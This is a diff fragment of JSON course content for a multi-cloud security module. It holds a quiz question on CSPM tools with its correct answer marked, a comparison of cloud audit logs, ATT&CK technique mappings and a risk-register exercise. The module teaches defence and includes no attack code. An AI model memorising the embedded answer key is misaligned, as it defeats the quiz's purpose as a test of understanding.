+              ]
+            },
+            "check": {
+              "question": "What does a CSPM/CNAPP tool such as ScoutSuite, Prowler or Wiz primarily provide across clouds?",
+              "options": [
+                "A faster way to launch virtual machines",
+                "A single normalised view of misconfigurations and risk across providers",
+                "A replacement for IAM in each cloud",
+                "An encrypted VPN between clouds"
+              ],
+              "correctIndex": 1,
+              "explanation": "CSPM/CNAPP tools ingest configuration from every connected cloud and present one consistent, ranked list of misconfigurations and risks, so you are not comparing three different consoles by hand."
+            }
+          },
+          {
+            "title": "Equivalent audit logs",
+            "body": "Detection depends on knowing which log holds the answer in each cloud. They record the same thing — the control-plane API calls — under different names. Centralise all three into one SIEM and write detections against the common actions (role granted, key created, policy made public, token minted from metadata).",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "AWS",
+                  "points": [
+                    "CloudTrail",
+                    "Management + data events",
+                    "e.g. AssumeRole, PutBucketPolicy"
+                  ]
+                },
+                {
+                  "label": "Azure",
+                  "points": [
+                    "Azure Activity Log",
+                    "Plus Entra sign-in / audit logs",
+                    "e.g. role assignment write"
+                  ]
+                },
+                {
+                  "label": "GCP",
+                  "points": [
+                    "Cloud Audit Logs",
+                    "Admin Activity + Data Access",
+                    "e.g. SetIamPolicy, keys.create"
+                  ]
+                }
+              ]
+            }
+          },
+          {
+            "title": "Mapping ATT&CK consistently",
+            "body": "MITRE ATT&CK gives a provider-neutral language so the same technique reads the same across clouds. Examples that recur in this module:\n- Valid Accounts: Cloud Accounts (T1078.004) — using stolen IAM/Entra/GCP identities.\n- Unsecured Credentials: Cloud Instance Metadata API (T1552.005) — the metadata token theft you practised in all three clouds.\n- Account Manipulation and Additional Cloud Roles (T1098) — granting yourself Owner via roleAssignments/write or setIamPolicy.\n\nTagging each finding with an ATT&CK technique lets you compare coverage and detection across providers on equal terms."
+          },
+          {
+            "title": "Build one cross-cloud risk register",
+            "body": "The exercise that ties the module together: collapse all findings — AWS, Azure, GCP — into a single prioritised register. One row per issue, with columns for asset, cloud, finding, mapped ATT&CK technique, exploitability, impact, severity and owner.\n\nCrucially, prioritise by exploitability and business impact, not by which cloud it lives in. A public GCS bucket of customer data outranks a theoretical Azure misconfig, even if most of your estate is in Azure. The register is the deliverable a CISO can act on.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "Collect findings",
+                  "detail": "CSPM across 3 clouds"
+                },
+                {
+                  "label": "Normalise",
+                  "detail": "common model + ATT&CK"
+                },
+                {
+                  "label": "Rank",
+                  "detail": "exploitability x impact"
+                },
+                {
+                  "label": "Risk register",
+                  "detail": "owners + remediation"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Why it matters",
+            "body": "Multi-cloud security fails when teams treat each cloud as a separate world and let findings pile up in three dashboards no one reconciles. The common model — principals, grants, resource policies, metadata, logging — plus one CSPM view, one log pipeline, one ATT&CK mapping and one risk register turns three providers into a single, defensible surface. That unification, not any single-cloud trick, is what keeps a real-world multi-cloud estate secure."
+          }
+        ]
+      }
+    ]
+  }
+]
